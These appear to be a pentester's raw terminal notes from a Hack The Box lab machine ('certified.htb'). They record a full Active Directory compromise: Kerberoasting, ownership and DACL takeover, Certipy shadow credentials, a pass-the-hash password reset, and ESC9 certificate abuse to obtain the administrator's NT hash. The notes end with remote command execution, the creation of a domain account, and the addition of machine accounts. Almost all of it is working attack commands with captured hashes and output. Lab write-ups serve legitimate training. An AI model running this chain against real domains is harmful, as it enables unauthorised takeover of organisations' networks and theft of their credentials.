
```
kali@kali ~> nmap -sC -sV -Pn 10.129.202.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 07:12 EST
Nmap scan report for 10.129.202.17
Host is up (0.070s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-03 19:14:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-03T19:15:22+00:00; +7h01m22s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-03T19:15:22+00:00; +7h01m22s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-03T19:15:22+00:00; +7h01m22s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-03T19:15:22+00:00; +7h01m22s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-03T19:14:43
|_  start_date: N/A
|_clock-skew: mean: 7h01m22s, deviation: 0s, median: 7h01m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.82 seconds

```


```
kali@kali ~> nmap -sC -sV -Pn -p- 10.129.202.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 07:16 EST
Nmap scan report for 10.129.202.17
Host is up (0.065s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-03 19:20:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-03T19:22:17+00:00; +7h01m23s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-03T19:22:17+00:00; +7h01m23s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-03T19:22:17+00:00; +7h01m23s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-03T19:22:17+00:00; +7h01m23s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
54760/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h01m22s, deviation: 0s, median: 7h01m22s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-03T19:21:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 276.31 seconds

```



```
kali@kali ~> netexec ldap 10.129.202.17 -u 'judith.mader' -p 'judith09' --kerberoasting kerb.txt --kdcHost DC01.certified.htb
SMB         10.129.202.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.129.202.17   389    DC01             [+] certified.htb\judith.mader:judith09
LDAP        10.129.202.17   389    DC01             [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
LDAP        10.129.202.17   389    DC01             Bypassing disabled account krbtgt
LDAP        10.129.202.17   389    DC01             [*] Total of records returned 1
LDAP        10.129.202.17   389    DC01             sAMAccountName: management_svc memberOf: CN=Management,CN=Users,DC=certified,DC=htb pwdLastSet: 2024-05-13 11:30:51.476756 lastLogon:<never>
LDAP        10.129.202.17   389    DC01             $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$7d3bf3fccc0e62a06350c118f42018e4$6d7df7323dcc54b097938a3893b43d653b3dfa0a7778ffa3a4531ca7f22cb86f7d2a584c304c0a86a0d83d1c12f1d808e715b116159279e324698832e8e8e81963c432684f435666e90a91172ddf1e71ee3b7bc10ed70d39524572cdcadbe313825ab8deabb61d961376a9bf6d541844117b82fe1edf0a96a54fdf921081e4b8a98e8cb3e218fa424b6874d260128f12053f15f3330de4e1887a8b013d3eeaa92c52fb7e56f29c4c17b81152e5ee209264c397329c511cd8ff74d2c92a4b491a9e58fcd4ab59b0726bb31f7ec23b6931bf1d60903e1a5cd1e8feec35a21141ef8a5a82e074d63f77dc26938e41d68cbf942fdaa0c241949f456fd1c21fb449cc614755711a4796580f85ac534e23d762c07b3f8e700cc1fc6b8815e2d87f648f19b5c44854566309ec5a425ad134ad3f3f427bceb31a4d496ec0643e07d792e2c71b84bcd0a35624ff59ffdcbd68cb5289b89be89efe68a532da7fbed29328ed3ebf3349b6207333f4d1a154d7103276994fe46b57556b7c48380dd13573d46800094cdfde55a7f569a98d72aa976f54b9a58c1a2ae6f7f473eabdd81ad1e8d206b261df3d0ea8fb161702d9413ab1c6e6f2c05e8611fe75b7d31f3885f1c9b96d2d6a08c2ae2c296ee11023d2abf1fb09f98689446c14267ff3870d09cfbb1d3041b277173cabbfc2398f2db6a66f6ac642fac0ee6f085727f912855ae4ec3fdf347955fe5205e33bfca107649fb1c59b5cd1d39b3e0a6a6f00e4116d837266cdb0607ada10949769ba425af77543cecbbe22a57ebf35f795ff36bc9401d1135b99c25d5085beebbb8d4e34091dcb65a8fef29b3771c9270bef8b11db5b1ab70648d19ff0d6f9d930d33c5a721a0176f4e28ec48dec154dd7cd798cc7251f84f09234565bf575925eaee2f346d6d34be9a7524eb25271308d05c3ebf7165581a63f9489b351060348b9365ea3f617e3f707bf35e36bfec7fc45d15550bb683a13157ecfdedd1604869f5a61866a8c84ffe397382de522d65d33fc333737341750e2eee4b8fcaa981edc8812c4f48c211ed32accedce46e96541900e5bbc8456a9ee85949a05b7c5d1321345e6d83c3225323dd462f4cbb5bff0a1b2e5b881c3ca1a3389e3e54358b6ef0f84d75d37bbd01822ad8fae599d85188f246da86f683ba97a5ff430b695126bf5378b25ea5bc78416a1e14cb261eced7618fe13bf8f119f8a84df5979459ddbdd4b4d13309f9059fef26a3f49e05362ab717e47661a2b8c9be87211cf401b06bed253ea95264e6dd96bf068439fd8283146d02b1313ab1e8768fa4b0666f662733947a2a6d32a8e14754970f6e22d19713dc656ef1ecc4a8e3d9040ffbff3f166d115931225a878db9cecabfa71400516b65713e6ea65874511842b7885e77f638790e08af36c5bc17d9c06f6191d82e1c4d937752b5c9402f2b38c5df3217dbe84ca362888e88d1c81e79506e5b067deea485cf4c0ff324fb42a6d3d4f74a350e79e7f13e0306e3513375e988cd75159f8a2963c54fc6187b4c5bc042f4c453b54bcf4db9b25481666a9aa7a57ac0a

```


```
kali@kali ~ [255]> owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
/usr/local/bin/owneredit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'owneredit.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
kali@kali ~> dacledit.py -action 'write' -rights 'FullControl' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
/usr/local/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'dacledit.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20241103-162658.bak
[*] DACL modified successfully!
kali@kali ~> net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.202.17"
kali@kali ~> bloodyAD --host dc01.certified.htb -d certified.htb -u judith.mader -p judith09 --dc-ip 10.129.202.17--verbose get membership judith.mader

distinguishedName: CN=Users,CN=Builtin,DC=certified,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Domain Users,CN=Users,DC=certified,DC=htb
objectSid: S-1-5-21-729746778-2675978091-3820388244-513
sAMAccountName: Domain Users

distinguishedName: CN=Management,CN=Users,DC=certified,DC=htb
objectSid: S-1-5-21-729746778-2675978091-3820388244-1104
sAMAccountName: Management
kali@kali ~> certipy shadow auto -username judith.mader@certified.htb -p 'judith09' -account management_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fae7aa92-7b83-02bd-c536-ee6b88497a43'
[*] Adding Key Credential with device ID 'fae7aa92-7b83-02bd-c536-ee6b88497a43' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'fae7aa92-7b83-02bd-c536-ee6b88497a43' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584

```


```
kali@kali ~> pth-net rpc password "CA_OPERATOR" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" -S "dc01.certified.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...

```


```
^C⏎                                                                                                                                                                         kali@kali ~ [SIGINT]> certipy shadow auto -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd82d0002-25ba-84b5-77bc-469c30c3677d'
[*] Adding Key Credential with device ID 'd82d0002-25ba-84b5-77bc-469c30c3677d' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'd82d0002-25ba-84b5-77bc-469c30c3677d' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': 20ad8cf19d7ea9189bb4412b8d2e0697
```

```
kali@kali ~> netexec ldap 10.129.202.17 -u 'CA_OPERATOR' -p 'newP@ssword2022'
SMB         10.129.202.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.129.202.17   389    DC01             [+] certified.htb\CA_OPERATOR:newP@ssword2022
LDAP        10.129.202.17   389    DC01             Node CA_OPERATOR@CERTIFIED.HTB successfully set as owned in BloodHound

```

```
kali@kali ~> certipy find -u 'CA_OPERATOR@certified.htb' -p 'newP@ssword2022' -dc-ip 10.129.202.17 -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20241103163301_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20241103163301_Certipy.txt'
[*] Saved JSON output to '20241103163301_Certipy.json'
kali@kali ~> cat 20241103163301_Certipy.txt
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension

```


![[scan-20241103173833025.webp]]





https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7



```
kali@kali ~> certipy account update -username "management_svc@certified.htb" -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user CA_operator -upn administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
kali@kali ~> certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3^C
kali@kali ~ [2]> certipy req -username "ca_operator@certified.htb" -hashes "20ad8cf19d7ea9189bb4412b8d2e0697" -target "certified.htb" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: rpc_s_access_denied
[-] Use -debug to print a stacktrace
kali@kali ~> certipy req -username 'ca_operator@certified.htb' -hashes '20ad8cf19d7ea9189bb4412b8d2e0697' -target 'certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: rpc_s_access_denied
[-] Use -debug to print a stacktrace
kali@kali ~> certipy shadow auto -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0b948415-9522-ba02-e679-12901ff6e304'
[*] Adding Key Credential with device ID '0b948415-9522-ba02-e679-12901ff6e304' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '0b948415-9522-ba02-e679-12901ff6e304' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': fb54d1c05e301e024800c6ad99fe9b45



kali@kali ~> certipy req -username 'ca_operator@certified.htb' -hashes 'fb54d1c05e301e024800c6ad99fe9b45' -target 'certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
kali@kali ~> pth-net rpc password "CA_OPERATOR" "newP@ssword2022" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1832bcdd4677c28b5a6a1295584" -S "dc01.certified.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
kali@kali ~> certipy shadow auto -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -account ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ddb0dbf8-46dc-fffa-0fed-172cd7f7b68c'
[*] Adding Key Credential with device ID 'ddb0dbf8-46dc-fffa-0fed-172cd7f7b68c' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'ddb0dbf8-46dc-fffa-0fed-172cd7f7b68c' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': fb54d1c05e301e024800c6ad99fe9b45
kali@kali ~> certipy account update -username "management_svc@certified.htb" -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user CA_operator -upn administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
kali@kali ~> certipy req -username 'ca_operator@certified.htb' -password 'newP@ssword2022' -target 'certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

kali@kali ~> certipy account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn "ca_operator@certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
kali@kali ~> certipy auth -pfx 'administrator.pfx' -domain "certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
 ⏎                                                                                                                                                                                                                   kali@kali ~> netexec smb 10.129.202.17 -u 'administrator' -H 0d5b49608bbce1751f708748f67e2d34
SMB         10.129.202.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.202.17   445    DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
SMB         10.129.202.17   445    DC01             Node ADMINISTRATOR@CERTIFIED.HTB successfully set as owned in BloodHound
SMB         10.129.202.17   445    DC01             [-] Account not found in the BloodHound database.
kali@kali ~> netexec smb 10.129.202.17 -u 'administrator' -H 0d5b49608bbce1751f708748f67e2d34 -x 'type c:\users\administrator\desktop\root.txt'
SMB         10.129.202.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.202.17   445    DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
SMB         10.129.202.17   445    DC01             [-] Account not found in the BloodHound database.
SMB         10.129.202.17   445    DC01             [+] Executed command via wmiexec
SMB         10.129.202.17   445    DC01             d7931b03cb3257fd185b6a734a84be03

```




----




# testing


```
kali@kali ~> addcomputer.py -method LDAPS -dc-ip 10.129.75.34 -computer-pass TestPassword321 -computer-name testComputer certified.htb/administrator -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'
/usr/local/bin/addcomputer.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'addcomputer.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account testComputer$ with password TestPassword321.
```




```
kali@kali ~> dacledit.py -action 'read' -rights 'FullControl' -principal 'management_svc' -target 'testComputer$' 'certified.htb'/'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'
/usr/local/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'dacledit.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-729746778-2675978091-3820388244-1105)
[*]   ACE[16] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : management_svc (S-1-5-21-729746778-2675978091-3820388244-1105)

```


```

```



### testing v2

```
kali@kali ~> addcomputer.py -method LDAPS -dc-ip 10.10.11.41 -computer-pass TestPassword321 -computer-name LimitTesting certified.htb/administrator -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'
/usr/local/bin/addcomputer.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'addcomputer.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account LimitTesting$ with password TestPassword321.
```


```
kali@kali ~> dacledit.py -action 'write' -rights 'FullControl' -principal 'LimitTesting$' -target 'ca_operator' 'certified.htb'/'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'
/usr/local/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'dacledit.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20241106-172538.bak
[*] DACL modified successfully!


```


```
kali@kali ~> dacledit.py -action 'read' -rights 'FullControl' -principal 'LimitTesting$' -target 'ca_operator' 'certified.htb'/'administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34'
/usr/local/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.12.0', 'dacledit.py')
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-729746778-2675978091-3820388244-5601)
[*]   ACE[20] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : LimitTesting$ (S-1-5-21-729746778-2675978091-3820388244-5601)
```


```
kali@kali ~> netexec smb 10.10.11.41 -u administrator -H '0d5b49608bbce1751f708748f67e2d34' -x 'net user SawyerDomain password123 /add /domain'
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
SMB         10.10.11.41     445    DC01             [-] Account not found in the BloodHound database.
SMB         10.10.11.41     445    DC01             [+] Executed command via wmiexec
SMB         10.10.11.41     445    DC01             The command completed successfully.
```

```
kali@kali ~> netexec smb 10.10.11.41 -u administrator -H '0d5b49608bbce1751f708748f67e2d34' -x 'net user SawyerDomain password123 /add /domain'
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
SMB         10.10.11.41     445    DC01             [-] Account not found in the BloodHound database.
SMB         10.10.11.41     445    DC01             [+] Executed command via wmiexec
SMB         10.10.11.41     445    DC01             The command completed successfully.
```
	 
```
